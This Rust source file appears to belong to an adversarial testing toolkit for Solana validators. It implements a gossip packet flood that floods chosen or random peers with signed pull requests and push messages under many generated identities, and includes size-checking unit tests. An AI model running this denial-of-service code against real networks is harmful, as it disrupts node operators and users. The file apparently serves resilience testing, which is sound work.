use {
    crate::{
        adversary_feature_set::gossip_packet_flood::{FloodConfig, FloodStrategy},
        flood_worker::{
            create_rayon_thread_pool, init_keypair_pool, AdversaryWorkersContext, ExitCondition,
        },
        PeerIdentifierSanitized,
    },
    bincode::serialize,
    log::{error, info},
    rand::seq::SliceRandom,
    rayon::{prelude::*, ThreadPool},
    solana_gossip::{
        cluster_info::ClusterInfo,
        contact_info::ContactInfo,
        crds_data::CrdsData,
        crds_gossip_pull::CrdsFilter,
        crds_value::CrdsValue,
        protocol::{split_gossip_messages, Protocol},
    },
    solana_keypair::Keypair,
    solana_net_utils::bind_to_unspecified,
    solana_packet::PACKET_DATA_SIZE,
    solana_signer::Signer,
    solana_streamer::sendmmsg::{batch_send, SendPktsError},
    std::{
        net::UdpSocket,
        sync::{Arc, RwLock},
        thread::{self, Builder},
        time::{Duration, Instant},
    },
};

/// Size of a serialized empty push message:
/// 'Protocol::PushMessage(Pubkey::default(), Vec::default())'.
/// This is verified in[`tests::generate_one_serialized_empty_push_message`].
const PUSH_MESSAGE_EMPTY_SIZE: usize = 44;

/// Payload size of serialized crds-values that fit in a Protocol::PushMessage packet.
const PUSH_MESSAGE_MAX_PAYLOAD_SIZE: usize = PACKET_DATA_SIZE - PUSH_MESSAGE_EMPTY_SIZE;

/// Number of CRDS values to pack in a push messsage in PushContactInfo gossip
/// flood attacks. Setting this value greater than 1 ensures the target node
/// is checking every single CrdsValue within the received PushMessage.
/// The actual number of CrdsValues packed in a push message is determined at runtime
/// and affected by the size of customer_info for that node.
/// This is verified in [`tests::generate_one_serialized_push_message`].
const NUM_CRDS_VALUES_PER_PUSH_MSG: usize = 10;

pub struct GossipPacketFlood;

impl GossipPacketFlood {
    pub fn start(
        cluster_info: Arc<ClusterInfo>,
        configs: Vec<FloodConfig>,
    ) -> AdversaryWorkersContext {
        let exit = Arc::new(ExitCondition::default());
        let thread_pool = create_rayon_thread_pool("solAdvGPFWrkr");
        let keypair_pool = Arc::new(RwLock::new(Vec::default()));

        let mut i: usize = 0;
        let thread_hdls = configs
            .into_iter()
            .map(|config| {
                // We do not care what port this socket will use, as we are only going to send
                // packets from it.  It would be nice to consider the gossip address IP version.
                // But everything seems to be hardcoded to IPv4, so skip it for now.
                let send_socket = bind_to_unspecified().expect("Can bind to any local address");
                let cluster_info = cluster_info.clone();
                let exit = exit.clone();
                let thread_pool = thread_pool.clone();
                let thread_name = format!("solAdvGpFld{i:02}");
                let keypair_pool = keypair_pool.clone();

                i = i.saturating_add(1);
                Builder::new()
                    .name(thread_name.clone())
                    .spawn(move || {
                        Self::run(
                            &send_socket,
                            &cluster_info,
                            &exit,
                            &thread_pool,
                            config,
                            thread_name,
                            &keypair_pool,
                        );
                    })
                    .unwrap()
            })
            .collect();
        AdversaryWorkersContext::new(exit, thread_hdls)
    }

    fn create_flood_gossip_packet(
        cluster_info: &ClusterInfo,
        keypair: &Keypair,
        flood_strategy: &FloodStrategy,
    ) -> Vec<u8> {
        let msg = match flood_strategy {
            FloodStrategy::PullContactInfo => {
                let mut self_info = cluster_info.my_contact_info();
                self_info.adversary_set_pubkey(keypair.pubkey());
                let self_info = CrdsData::ContactInfo(self_info);
                let self_info = CrdsValue::new(self_info, keypair);
                let filter = CrdsFilter::new_rand(10, 1000);

                Protocol::PullRequest(filter, self_info)
            }
            FloodStrategy::PushContactInfo => {
                let mut self_info = cluster_info.my_contact_info();
                self_info.adversary_set_pubkey(keypair.pubkey());
                let spam_crds_values = (0..NUM_CRDS_VALUES_PER_PUSH_MSG)
                    .map(|_| CrdsValue::new(CrdsData::ContactInfo(self_info.clone()), keypair));

                let payloads: Vec<_> =
                    split_gossip_messages(PUSH_MESSAGE_MAX_PAYLOAD_SIZE, spam_crds_values)
                        .collect();

                Protocol::PushMessage(keypair.pubkey(), payloads[0].clone())
            }
        };

        serialize(&msg).unwrap()
    }

    fn flood_gossip_attack_generator(
        send_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        config: &FloodConfig,
        peers: &[ContactInfo],
        thread_pool: &ThreadPool,
        keypair_pool: &RwLock<Vec<Keypair>>,
    ) -> usize {
        const MIN_PARALLEL_ITEMS: usize = 1_000;
        const MAX_SENDMMSG_ITEMS: usize = 10_000;

        // Populate keypair pool if necessary
        // See GOSSIP_PING_CACHE_CAPACITY to size keypair_pool
        init_keypair_pool(
            keypair_pool,
            usize::try_from(config.packets_per_peer_per_iteration).unwrap(),
            thread_pool,
        );

        let mut packet_count: usize = 0;
        let keypairs = keypair_pool.read().unwrap();
        peers.iter().for_each(|peer| {
            for chunk in keypairs.chunks(MAX_SENDMMSG_ITEMS) {
                let reqs_v: Vec<_> = thread_pool
                    .install(|| {
                        chunk
                            .par_iter()
                            .with_min_len(MIN_PARALLEL_ITEMS)
                            .map(|keypair| {
                                let packet_buf = Self::create_flood_gossip_packet(
                                    cluster_info,
                                    keypair,
                                    &config.flood_strategy,
                                );

                                (packet_buf, peer.gossip().unwrap())
                            })
                    })
                    .collect();
                packet_count = packet_count.saturating_add(reqs_v.len());
                let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
                match batch_send(send_socket, reqs_iter) {
                    Ok(()) => (),
                    Err(SendPktsError::IoError(err, num_failed)) => {
                        packet_count = packet_count.saturating_sub(num_failed);
                        error!(
                            "batch_send failed to send {}/{} packets first error {:?}",
                            num_failed,
                            reqs_v.len(),
                            err
                        );
                    }
                }
            }
        });
        packet_count
    }

    fn run(
        send_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        exit: &ExitCondition,
        thread_pool: &ThreadPool,
        config: FloodConfig,
        thread_name: String,
        keypair_pool: &RwLock<Vec<Keypair>>,
    ) {
        const REPORT_INTERVAL_MS: u64 = 2_000;
        const DEFAULT_NUM_PEERS: usize = 10;
        let mut last_report = Instant::now();
        let mut iteration: u64 = 0;
        let mut packet_count: usize = 0;

        loop {
            if exit.is_set() {
                return;
            }

            let peers = {
                let peers = cluster_info.gossip_peers();
                if let Some(peer_id) = config.target.as_ref() {
                    // pubkey verified by RPC
                    let peer_id = PeerIdentifierSanitized::try_from(peer_id).unwrap();
                    let matches_ci = |ci: &&ContactInfo| -> bool {
                        match peer_id {
                            PeerIdentifierSanitized::Pubkey(pubkey) => pubkey == *ci.pubkey(),
                            PeerIdentifierSanitized::Ip(ip) => ip == ci.gossip().unwrap().ip(),
                        }
                    };
                    peers
                        .iter()
                        .find(matches_ci)
                        .cloned()
                        .map(|ci| vec![ci])
                        .unwrap_or_else(|| {
                            error!("gossip packet flood: target={peer_id:?} not found");
                            thread::sleep(Duration::from_secs(2));
                            Vec::default()
                        })
                } else {
                    let mut rng = rand::thread_rng();
                    peers
                        .choose_multiple(&mut rng, DEFAULT_NUM_PEERS)
                        .cloned()
                        .collect()
                }
            };

            packet_count = packet_count.saturating_add(Self::flood_gossip_attack_generator(
                send_socket,
                cluster_info,
                &config,
                &peers,
                thread_pool,
                keypair_pool,
            ));

            if last_report.elapsed() >= Duration::from_millis(REPORT_INTERVAL_MS) {
                let num_peers = peers.len();
                info!(
                    "gossip packet flood {thread_name}: num_peers={num_peers} \
                     iteration={iteration}, packets={packet_count}"
                );
                packet_count = 0;
                last_report = Instant::now();
            }
            iteration = iteration.saturating_add(1);
            if config.iteration_delay_us > 0
                && exit.wait_is_set(Duration::from_micros(config.iteration_delay_us))
            {
                return;
            }
        }
    }
}

#[cfg(test)]
pub mod tests {
    use {
        super::GossipPacketFlood,
        crate::{
            adversary_feature_set::gossip_packet_flood::FloodStrategy,
            gossip::{NUM_CRDS_VALUES_PER_PUSH_MSG, PUSH_MESSAGE_EMPTY_SIZE},
        },
        bincode::{deserialize, serialize},
        log::debug,
        solana_gossip::{cluster_info::ClusterInfo, contact_info::ContactInfo, protocol::Protocol},
        solana_keypair::Keypair,
        solana_packet::PACKET_DATA_SIZE,
        solana_pubkey::Pubkey,
        solana_signer::Signer,
        solana_streamer::socket::SocketAddrSpace,
        solana_time_utils::timestamp,
        std::sync::Arc,
    };

    #[test]
    fn generate_one_serialized_empty_push_message() {
        let msg = Protocol::PushMessage(Pubkey::default(), Vec::default());
        let packet_buf = serialize(&msg).unwrap();

        // If this assertion fails, the packet size definition in this file needs
        // to be updated and will impact push message payload size downstream.
        assert_eq!(packet_buf.len(), PUSH_MESSAGE_EMPTY_SIZE);
    }

    #[test]
    fn generate_one_serialized_pull_request() {
        let keypair = Arc::new(Keypair::new());
        let contact_info = ContactInfo::new_localhost(&keypair.pubkey(), timestamp());
        let cluster_info =
            ClusterInfo::new(contact_info, keypair.clone(), SocketAddrSpace::Unspecified);

        let packet_buf = GossipPacketFlood::create_flood_gossip_packet(
            &cluster_info,
            &keypair,
            &FloodStrategy::PullContactInfo,
        );

        debug!("Serialized packet buffer size: {} bytes.", packet_buf.len(),);

        assert!(
            packet_buf.len() <= PACKET_DATA_SIZE,
            "Serialized packet buffer size ({} bytes) exceeds the packet size ({} bytes).",
            packet_buf.len(),
            PACKET_DATA_SIZE
        );
    }

    #[test]
    fn generate_one_serialized_push_message() {
        let keypair = Arc::new(Keypair::new());
        let contact_info = ContactInfo::new_localhost(&keypair.pubkey(), timestamp());
        let cluster_info =
            ClusterInfo::new(contact_info, keypair.clone(), SocketAddrSpace::Unspecified);

        let packet_buf = GossipPacketFlood::create_flood_gossip_packet(
            &cluster_info,
            &keypair,
            &FloodStrategy::PushContactInfo,
        );

        debug!("Serialized packet buffer size: {} bytes.", packet_buf.len());

        assert!(
            packet_buf.len() <= PACKET_DATA_SIZE,
            "Serialized packet buffer size: {} bytes exceeds the packet size: {} bytes.",
            packet_buf.len(),
            PACKET_DATA_SIZE
        );

        let msg = deserialize(&packet_buf).unwrap();

        match msg {
            Protocol::PushMessage(pubkey, crds_values) => {
                debug!(
                    "Push message packed {} crds-values for pubkey: {}",
                    crds_values.len(),
                    pubkey,
                );
                assert_eq!(pubkey, keypair.pubkey());
                assert!(crds_values.len() <= NUM_CRDS_VALUES_PER_PUSH_MSG);
                assert_ne!(crds_values, vec![]);
            }
            _ => panic!("Expected and actual deserialized push message contents do not match"),
        }
    }
}
